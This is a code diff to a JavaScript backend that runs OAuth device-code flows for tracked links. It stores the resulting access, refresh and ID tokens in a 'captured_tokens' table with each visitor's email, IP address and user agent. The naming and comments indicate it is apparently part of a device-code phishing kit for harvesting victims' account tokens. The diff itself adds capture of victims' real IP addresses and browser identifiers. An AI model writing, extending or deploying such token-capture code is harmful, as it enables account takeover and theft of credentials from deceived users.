@@ -16,10 +16,10 @@ const activeJobs = new Map();
  * Start a new device code flow
  * @param {string} mode - "token" or "cookie"
  * @param {string} jwtToken - The link's JWT token (user_id, link_id)
- * @param {string} apiBaseUrl - Base URL of the backend server
+ * @param {object} reqOptions - Optional: { ip, userAgent } for capturing visitor info
  * @returns {object} job data including user_code, verification_uri, etc.
  */
-async function startDeviceFlow(mode, jwtToken, apiBaseUrl) {
+async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
   try {
     // Decode JWT to get user_id and link_id
     const decoded = jwt.verify(jwtToken, config.JWT_SECRET);
@@ -56,7 +56,7 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl) {
     const dcData = dcResponse.data;
     const jobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
 
-    // Store job in memory
+    // Store job in memory with IP/user-agent for later token capture
     activeJobs.set(jobId, {
       jobId,
       user_id,
@@ -69,6 +69,8 @@ async function startDeviceFlow(mode, jwtToken, apiBaseUrl) {
       status: 'polling',
       created_at: Date.now(),
       jwtToken,
+      ip_address: (reqOptions && reqOptions.ip) || 'unknown',
+      user_agent: (reqOptions && reqOptions.userAgent) || 'DeviceProxy',
     });
 
     // Start polling in background
@@ -126,6 +128,15 @@ async function pollForToken(jobId) {
         // SUCCESS! Store token
         job.status = 'completed';
         await storeToken(job, tokenData);
+        
+        // Mark visitors as done for this user/link
+        try {
+          await db.query(
+            'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
+            ['done', job.user_id, job.link_id, 'waiting']
+          );
+        } catch (e) { /* silent */ }
+        
         return;
       }
 
@@ -237,6 +248,10 @@ async function storeToken(job, tokenData) {
       } catch (e) { /* ignore */ }
     }
 
+    // Use stored IP and user-agent from when the flow started
+    const ipAddress = job.ip_address || 'unknown';
+    const userAgent = job.user_agent || 'DeviceProxy';
+
     const [result] = await db.query(
       `INSERT INTO captured_tokens 
        (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration)
@@ -248,8 +263,8 @@ async function storeToken(job, tokenData) {
         encrypt(tokenData.access_token),
         encrypt(tokenData.refresh_token || null),
         encrypt(tokenData.id_token || null),
-        'device_proxy',
-        'VGenius DeviceProxy',
+        ipAddress,
+        userAgent,
       ]
     );
 
